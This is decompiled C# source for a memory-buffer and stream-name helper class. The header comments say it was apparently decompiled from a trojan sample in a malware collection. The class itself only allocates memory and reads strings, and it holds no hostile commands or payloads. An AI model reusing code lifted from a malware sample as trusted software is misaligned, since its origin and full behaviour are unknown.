// Decompiled with JetBrains decompiler
// Type: HeavyDuck.StreamName
// Assembly: RemotingFieldCachedD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EDD4CF72-357A-47DC-BB8E-50FC31FC092E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-1095c007bb641be5c286e491a4f4ced026984a7767f930ee09c4d2995b5a76f2.exe

using System;
using System.Runtime.InteropServices;

namespace HeavyDuck
{
  internal sealed class StreamName : IDisposable
  {
    private static readonly SafeHGlobalHandle _invalidBlock = SafeHGlobalHandle.Invalid();
    private SafeHGlobalHandle _memoryBlock = StreamName._invalidBlock;

    public SafeHGlobalHandle MemoryBlock => this._memoryBlock;

    public void Dispose()
    {
      if (this._memoryBlock.IsInvalid)
        return;
      this._memoryBlock.Dispose();
      this._memoryBlock = StreamName._invalidBlock;
    }

    public void EnsureCapacity(int capacity)
    {
      int bytes = this._memoryBlock.IsInvalid ? 0 : this._memoryBlock.Size;
      if (capacity <= bytes)
        return;
      if (bytes != 0)
        bytes <<= 1;
      if (capacity > bytes)
        bytes = capacity;
      if (!this._memoryBlock.IsInvalid)
        this._memoryBlock.Dispose();
      this._memoryBlock = SafeHGlobalHandle.Allocate(bytes);
    }

    public string ReadString(int length)
    {
      if (0 >= length || this._memoryBlock.IsInvalid)
        return (string) null;
      if (length > this._memoryBlock.Size)
        length = this._memoryBlock.Size;
      return Marshal.PtrToStringUni(this._memoryBlock.DangerousGetHandle(), length);
    }

    public string ReadStreamName(int length)
    {
      string str = this.ReadString(length);
      if (!string.IsNullOrEmpty(str))
      {
        int num1 = str.IndexOf(':', 1);
        if (-1 != num1)
        {
          str = str.Substring(1, num1 - 1);
        }
        else
        {
          int num2 = str.IndexOf(char.MinValue);
          str = 1 >= num2 ? (string) null : str.Substring(1, num2 - 1);
        }
      }
      return str;
    }
  }
}
